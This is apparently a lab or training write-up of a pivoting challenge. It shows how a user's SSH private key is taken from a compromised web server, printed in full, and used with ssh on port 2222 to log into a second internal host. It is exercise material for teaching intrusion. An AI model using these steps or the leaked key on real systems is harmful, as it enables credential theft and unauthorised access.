# **Challenge 3: Pivoting**
!!! note ""
## **Procedure:**

Now that you can run commands on the web server, we want to find a way to pivot into the other Linux machine on the network.   

- Search the webserver for SSH keys you can copy. 
Hint: Where do each users' SSH keys tend to live? 
- Once you've found a key to test, copy it to your Kali machine.
Note: There are some tricky ways to copy the file directly, but this is a great place to keep it simple. Copy and paste the contents of the key from one window to another.
- Use the key to connect from your Kali machine to the other Linux server you found earlier, using the non-standard port number revealed in your scans.

**Hint**: How do you use a specific key file with SSH? How do you define a custom port to connect to? 

**Hint**: You will need to know which username to try and connect with. Which user did the stolen key originally belong to? 

**Note**: Some SSH clients will refuse to use a key with file permissions that are too open. You will need to ensure ONLY the key file owner has read, write, or execute permissions. 

## **Solution:**

### Search the webserver for **[SSH keys](https://www.ssh.com/academy/ssh-keys)**

![alt text](images/Pasted%20image%2020240507230632.png)


### Accesing the home folder of the user alice-devops

![alt text](images/Pasted%20image%2020240507230800.png)

### Accesing the .ssh folder 

![alt text](images/Pasted%20image%2020240507230921.png)

### Accesing the **[id_rsa.pem](https://www.howtogeek.com/devops/what-is-a-pem-file-and-how-do-you-use-it/)**

![alt text](images/Pasted%20image%2020240507231043.png)



### Copy the SSH key to the Kali machine

```bash linenums="1" hl_lines="2 54"
┌──(kali㉿kali)-[~]
└─$ cat alice_key.pem 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ ll
total 40
drwxr-xr-x 2 kali kali 4096 Nov 23  2022 DCV-Storage
drwxr-xr-x 2 kali kali 4096 May  8 02:41 Desktop
drwxr-xr-x 2 kali kali 4096 Nov 23  2022 Documents
drwxr-xr-x 2 kali kali 4096 Nov 23  2022 Downloads
drwxr-xr-x 2 kali kali 4096 Nov 23  2022 Music
drwxr-xr-x 2 kali kali 4096 Nov 23  2022 Pictures
drwxr-xr-x 2 kali kali 4096 Nov 23  2022 Public
drwxr-xr-x 2 kali kali 4096 Nov 23  2022 Templates
drwxr-xr-x 2 kali kali 4096 Nov 23  2022 Videos
-rw------- 1 kali kali 2602 May  8 01:48 alice_key.pem
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ 
```

### Connect from your Kali machine to the other Linux server (port 2222/SSH)

```bash linenums="1" hl_lines="2 5 30"
┌──(kali㉿kali)-[~]
└─$ chmod 600 alice_key.pem #Providing permissions
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ ssh ssh -i alice_key.pem alice-devops@172.31.44.198 -p 2222
Welcome to Ubuntu 22.04 LTS (GNU/Linux 6.5.0-1018-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May  8 03:26:25 UTC 2024

  System load:  0.13037109375      Processes:             200
  Usage of /:   33.7% of 19.20GB   Users logged in:       0
  Memory usage: 36%                IPv4 address for eth0: 172.31.44.198
  Swap usage:   0%

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

257 updates can be applied immediately.
11 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May  8 01:50:31 2024 from 172.31.39.126
alice-devops@ubuntu22:~$ 
```

![alt text](images/Pasted%20image%2020240507232829.png)

<div id="disqus_thread"></div>
<script>
    /**
    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
    /*
    var disqus_config = function () {
    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    */
    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://hcoco1-1.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>



!!! note ""

<div class="button-container" markdown="1">
<a href="/Career-Simulation-3/challenge_2/" class="md-button md-button--primary">Previous: Challenge 2</a>
<a href="/Career-Simulation-3/" class="md-button md-button--secondary">Home 🏠</a>
<a href="/Career-Simulation-3/challenge_4/" class="md-button md-button--primary">Next: Challenge 4</a>
</div>